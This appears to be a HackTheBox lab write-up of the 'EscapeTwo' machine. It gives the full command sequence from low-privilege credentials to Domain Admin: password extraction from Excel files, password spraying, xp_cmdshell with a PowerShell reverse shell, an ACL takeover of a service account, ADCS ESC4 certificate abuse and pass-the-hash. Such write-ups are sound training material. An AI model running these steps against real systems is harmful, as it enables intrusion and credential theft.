---
title: 'EscapeTwo: Breaking Out with Broken Files, From Corrupted Excel to Domain Admin'
published: 2026-05-12
description: ''
image: ''
tags: []
category: 'Penetration Tester'
draft: false 
lang: ''
---

# Introduction

This writeup details the complete compromise of the HackTheBox machine "EscapeTwo." The attack path involves an assumed breach with low-privileged credentials, information extraction from corrupted Excel files, lateral movement through found credentials, exploitation of a service account, abuse of Active Directory Certificate Services (ADCS) misconfigurations, and ultimately achieving Domain Admin privileges.

Below is a detailed breakdown of the attack chain.

## Reconnaissance

Initial reconnaissance was performed using `nmap` to identify open services on the target. The scan revealed a system that appeared to be a Windows Domain Controller with domain `sequel.htb` and hostname `DC01`.

```
$ nmap -p- --min-rate 10000 -sCV 10.10.11.55
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-01-13 08:20 EST
Nmap scan report for 10.10.11.55
Host is up (0.14s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 15:45:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The presence of Kerberos, LDAP, SMB (445), and WinRM (5985) indicated an Active Directory environment. Notably, **MSSQL** was also exposed on port 1433.

## Initial Access & Assumed Breach

As is common in many real-world Windows penetration tests, the engagement began with credentials for a low-privileged user:

- **Username:** `rose`
- **Password:** `KxEPkKe6R8su`

These credentials were confirmed to be valid for SMB and MS SQL Server but did not provide WinRM access.

```
$ nxc smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'
SMB         10.10.11.55    445    DC01             [+] sequel.htb\\rose:KxEPkKe6R8su
$ nxc mssql 10.10.11.55 -u rose -p KxEPkKe6R8su
MSSQL       10.10.11.55    1433   DC01             [+] sequel.htb\\rose:KxEPkKe6R8su
```

## Internal Enumeration

### SMB Shares

Enumerating SMB shares with the `rose` credentials revealed a non-standard "Accounting Department" share.

```
$ nxc smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.55    445    DC01
[+] sequel.htb\\rose:KxEPkKe6R8su
Share                  Permissions     Remark
-----                  -----------     ------
Accounting Department  READ
ADMIN$                 Remote Admin
C$                     Default share
IPC$                   READ            Remote IPC
NETLOGON               READ            Logon server share
SYSVOL                 READ            Logon server share
Users                  READ
```

Within the `Accounting Department` share, two Excel workbooks were found.

```
smb: \\> dir
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
```

## Extracting Credentials from Corrupted Excel Files

### Identifying File Types

Both workbooks appeared to be regular Excel files, but they were actually ZIP archives whose headers had been corrupted.

```
$ file *.xlsx
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan  01 1980 00:00:00, uncompressed size 1284, method=deflate
accounts.xlsx:       Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun  09 2024 10:47:44, uncompressed size 681, method=deflate
```

### Method 1: Direct Extraction

Using `unzip` to extract the XML contents of the workbook revealed the stored username and password information.

```
$ unzip accounts.xlsx -d accounts
Archive:  accounts.xlsx
...
inflating: accounts/xl/sharedStrings.xml
```

The critical data was located in `sharedStrings.xml`:

```
$ cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\\n"'; echo
First Name,Last Name,Email,Username,Password
Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99
Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG
Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!
```

### Method 2: Repairing the Header

An alternative method involved fixing the file's magic bytes. By overwriting the first four bytes with the correct `50 4B 03 04` (standard ZIP/XLSX signature), the files could be opened normally in LibreOffice or any spreadsheet application.

After repair:

```
$ file *.xlsx
accounting_2024.xlsx: Microsoft Excel 2007+
accounts.xlsx:       Microsoft Excel 2007+
```

### Extracted Credentials

| First Name | Last Name | Email | Username | Password |
| --- | --- | --- | --- | --- |
| Angela | Martin | angela@sequel.htb | angela | 0fwz7Q4mSpurIt99 |
| Oscar | Martinez | oscar@sequel.htb | oscar | 86LxLBMgEWaKUnBG |
| Kevin | Malone | kevin@sequel.htb | kevin | Md9Wlq1E5bZnVDVo |
| NULL |  | sa@sequel.htb | sa | MSSQLP@ssw0rd! |

### Validating Credentials (SMB)

A password spray confirmed that only `oscar`'s password was valid for SMB access, while `sa` would later prove to be the MSSQL local administrator.

```
$ nxc smb dc01.sequel.htb -u users -p passwords --continue-on-success
...
[+] sequel.htb\\oscar:86LxLBMgEWaKUnBG
```

## Shell as `sql_svc`

### Connecting as `sa` in MSSQL

Using the `sa` credentials with the `--local-auth` flag authenticated to the locally managed SQL Server account, bypassing domain restrictions.

```
$ mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
SQL (sa dbo@master)>
```

### Enabling `xp_cmdshell`

As the database administrator, the `xp_cmdshell` stored procedure could be re-enabled to execute arbitrary OS commands.

```
SQL (sa dbo@master)> enable_xp_cmdshell
INFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa dbo@master)> xp_cmdshell whoami
sequel\\sql_svc
```

### Establishing a Reverse Shell

A base64-encoded PowerShell reverse shell was executed via `xp_cmdshell` to obtain a more interactive session.

```
SQL (sa dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOA...
```

A connection was received on the listener, yielding a shell as `sequel\\sql_svc` (which has **SeImpersonatePrivilege**, though this was not the intended exploitation path).

```
$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.55 54229
PS C:\\Windows\\system32> whoami
sequel\\sql_svc
```

## Lateral Movement & Privilege Escalation

### Finding the SQL Service Account Password

Local file system enumeration of the `C:\\SQL2019\\ExpressAdv_ENU` directory uncovered the `sql-Configuration.INI` file containing credentials.

```
PS C:\\SQL2019\\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
...
SQLSVCACCOUNT="SEQUEL\\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
...
SAPWD="MSSQLP@ssw0rd!"
```

### Password Spraying & `ryan`

Using `netexec` to spray this password across known users identified `ryan` as a valid domain user. **Ryan also had WinRM access**, providing a much more stable shell.

```
$ nxc smb dc01.sequel.htb -u users -p WqSZAF6CysDQbGb3 --continue-on-success
...
[+] sequel.htb\\ryan:WqSZAF6CysDQbGb3
$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
*Evil-WinRM* PS C:\\Users\\ryan\\Documents>
```

The user flag was subsequently read:

```
*Evil-WinRM* PS C:\\Users\\ryan\\desktop> type user.txt
ec9ef945************************
```

## BloodHound Analysis: The Path to `CA_SVC`

Data was collected for BloodHound to analyze Active Directory relationships and permissions.

```
$ nxc ldap dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.10.11.55
```

Analysis of the imported data revealed a critical misconfiguration: the user `ryan` holds the **WriteOwner** privilege over the `CA_SVC` account. This permission allows an attacker to take ownership of and subsequently gain full control over `CA_SVC`.

## Compromising the `CA_SVC` Service Account

### Taking Ownership & Resetting Password

Using `powerview`, ownership of `CA_SVC` was transferred to `ryan`, a full control ACE was added, and the password was forcibly reset.

```
# Set owner to ryan
powerview ryan:'WqSZAF6CysDQbGb3'@sequel.htb -q "Set-DomainObjectOwner -PrincipalIdentity ryan -TargetIdentity CA_SVC"

# Grant Full Control
powerview ryan:'WqSZAF6CysDQbGb3'@sequel.htb -q "Add-DomainObjectAcl -TargetIdentity CA_SVC -PrincipalIdentity ryan -Rights fullcontrol -ACEType allowed"

# Reset password
powerview ryan:'WqSZAF6CysDQbGb3'@sequel.htb -q "Set-DomainUserPassword -Identity CA_SVC -AccountPassword P@ssw0rd"
```

## ADCS Exploitation: ESC4 to Domain Admin

### Identifying Vulnerable Certificate Template

With full control over `CA_SVC`, `certipy` was used to identify certificate templates vulnerable to ESC4 (a misconfiguration allowing a low-privileged user to modify the template to request certificates for any user, including Domain Admins).

```
$ certipy find -username CA_SVC@sequel.htb -password P@ssw0rd -target sequel.htb -target-ip 10.129.202.138 -dc-ip 10.129.202.138
```

The template `DunderMifflinAuthentication` was found to be exploitable.

### Exploiting ESC4 and Requesting an Administrator Certificate

The template was modified to add the necessary EKU and the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag. A certificate was then requested for the `administrator` user.

```
# Modify the template (ESC4)
certipy template -username CA_SVC@sequel.htb -password P@ssw0rd -template DunderMifflinAuthentication -save-old -target-ip 10.129.202.138 -dc-ip 10.129.202.138

# Request a certificate for the administrator (ESC1)
certipy req -username CA_SVC@sequel.htb -password P@ssw0rd -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -target-ip 10.129.202.138 -dc-ip 10.129.202.138
```

## Domain Admin Access & Flag Capture

### Retrieving the Administrator NTLM Hash

The generated `administrator.pfx` file was used to authenticate and retrieve the administrator's NTLM hash.

```
certipy auth -pfx administrator.pfx
```

Extracted NTLM hash: `7a8d4e04986afa8ed4060f75e5a0b3ff`

### Final Takeover with Pass-the-Hash

Using `evil-winrm` with the Administrator hash provided full control over the Domain Controller, and the root flag was secured.

```
$ evil-winrm -u administrator -i 10.129.142.61 -H "7a8d4e04986afa8ed4060f75e5a0b3ff"
*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type root.txt
```

# Summary of Attack Path

1. **Assumed Breach:** Low-privileged credentials (`rose`) were provided.
2. **Enumeration:** SMB enumeration revealed an "Accounting Department" share with two Excel files.
3. **Credential Extraction:** Passwords were recovered from corrupted Excel files, including the powerful local `sa` account for MSSQL.
4. **OS Command Execution:** `xp_cmdshell` was enabled as `sa`, granting a shell as the `sql_svc` service account (which also possessed `SeImpersonatePrivilege`, though it was not required).
5. **Service Account Discovery:** Configuration files on the file system revealed the password for `sql_svc`.
6. **Lateral Movement:** The `sql_svc` password was sprayed, compromising the user `ryan`.
7. **Active Directory Misconfiguration:** BloodHound analysis showed `ryan` had `WriteOwner` over the `CA_SVC` account, which was used to reset its password.
8. **ADCS Exploitation (ESC4):** Full control of `CA_SVC` allowed modification of a certificate template and the request of a certificate for `Administrator`.
9. **Domain Admin:** The retrieved certificate was used to obtain the Administrator's NTLM hash, leading to complete domain compromise via pass-the-hash.